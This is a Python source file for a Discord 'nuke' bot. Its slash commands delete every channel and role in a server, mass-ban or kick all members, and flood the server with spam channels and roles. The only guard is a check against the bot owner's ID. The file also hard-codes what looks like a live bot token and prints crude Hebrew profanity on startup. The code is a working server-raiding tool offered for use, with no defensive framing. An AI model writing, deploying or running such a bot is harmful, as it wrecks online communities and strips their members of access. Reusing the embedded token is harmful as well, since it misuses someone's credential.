import discord
from discord.ext import commands
import asyncio
import random

# ======================================
# CONFIGURATION
# ======================================

TOKEN = "MTQ5MjkxMTEyMDg2MjY3OTI1MA.G2m-8a.l8DHYDVf9TZQfcZlsan0FZvQ1WLx6TBqwABtWM"  
COMMAND_PREFIX = "!"
OWNER_ID = 1295019246048378924

# ======================================
# BOT SETUP
# ======================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

# ======================================
# UTILITY FUNCTIONS
# ======================================
async def ban_all_members(guild, exclude_ids=[OWNER_ID]):
    count = 0
    for member in guild.members:
        if member.id not in exclude_ids and not member.bot:
            try:
                await member.ban(reason="NUKE OPERATION")
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
    return count

async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.3)
        except:
            pass

async def delete_all_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass

# ======================================
# SLASH COMMANDS
# ======================================
@bot.tree.command(name="nuke", description=" TOTAL SERVER DESTRUCTION")
async def nuke(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Only the owner can use this.", ephemeral=True)
        return

    await interaction.response.send_message(" **NUKE INITIATED** \n*Brace for impact...*")
    guild = interaction.guild

    await delete_all_channels(guild)

    for i in range(50):
        try:
            await guild.create_text_channel(f"NUKE-{i}")
            await asyncio.sleep(0.3)
        except:
            pass

    await delete_all_roles(guild)
    banned = await ban_all_members(guild)

    channels = guild.text_channels
    if channels:
        try:
            invite = await channels[0].create_invite(max_age=300, max_uses=1)
            await interaction.followup.send(f" **NUKE COMPLETE** \nBanned {banned} members.\nInvite: {invite.url}")
        except:
            await interaction.followup.send(f" **NUKE COMPLETE** \nBanned {banned} members.\nCould not create invite.")
    else:
        await interaction.followup.send(f" **NUKE COMPLETE** \nBanned {banned} members.\nNo channels left.")

@bot.tree.command(name="purge_members", description="Ban all members from server")
async def purge_members(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(" Banning all members...")
    count = await ban_all_members(interaction.guild)
    await interaction.edit_original_response(content=f" Banned {count} members.")

@bot.tree.command(name="delete_all_channels", description="Delete every channel in server")
async def delete_channels_cmd(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(" Deleting all channels...")
    await delete_all_channels(interaction.guild)
    await interaction.edit_original_response(content=" All channels deleted.")

@bot.tree.command(name="spam_channels", description="Create many text channels")
async def spam_channels(interaction: discord.Interaction, amount: int = 50):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(f" Creating {amount} channels...")
    for i in range(amount):
        try:
            await interaction.guild.create_text_channel(f"SPAM-{i}")
            await asyncio.sleep(0.2)
        except:
            pass
    await interaction.edit_original_response(content=f" Created {amount} spam channels.")

@bot.tree.command(name="delete_all_roles", description="Remove all roles")
async def delete_roles_cmd(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(" Deleting all roles...")
    await delete_all_roles(interaction.guild)
    await interaction.edit_original_response(content=" All roles deleted.")

@bot.tree.command(name="role_spam", description="Create many random roles")
async def role_spam(interaction: discord.Interaction, amount: int = 30):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(f" Creating {amount} roles...")
    for i in range(amount):
        try:
            await interaction.guild.create_role(name=f"ROLE-{random.randint(1000,9999)}")
            await asyncio.sleep(0.2)
        except:
            pass
    await interaction.edit_original_response(content=f" Created {amount} random roles.")

@bot.tree.command(name="mass_ban", description="Ban every member")
async def mass_ban(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(" Mass banning...")
    count = await ban_all_members(interaction.guild)
    await interaction.edit_original_response(content=f" Banned {count} members.")

@bot.tree.command(name="mass_kick", description="Kick all members (instead of ban)")
async def mass_kick(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message(" Owner only.", ephemeral=True)
        return
    await interaction.response.send_message(" Kicking all members...")
    kicked = 0
    for member in interaction.guild.members:
        if member.id != OWNER_ID and not member.bot:
            try:
                await member.kick(reason="NUKE KICK")
                kicked += 1
                await asyncio.sleep(0.2)
            except:
                pass
    await interaction.edit_original_response(content=f" Kicked {kicked} members.")

# ======================================
# SYNC SLASH COMMANDS & RUN
# ======================================
@bot.event
async def on_ready():
    print(f"הבוט עובד לך תזיין לו תשרת: {bot.user}")
    print(f"הבוט עובד לך תזיין לו תשרת: {bot.user.id}")
    try:
        synced = await bot.tree.sync()
        print(f"הבוט עובד לך תזיין לו תשרת:{len(synced)} פקודות")
        print(f"הבוט עובד לך תזיין לו תשרת: {[cmd.name for cmd in bot.tree.get_commands()]}")
    except Exception as e:
        print(f"הבוט עובד לך תזיין לו תשרת: {e}")

bot.run(TOKEN)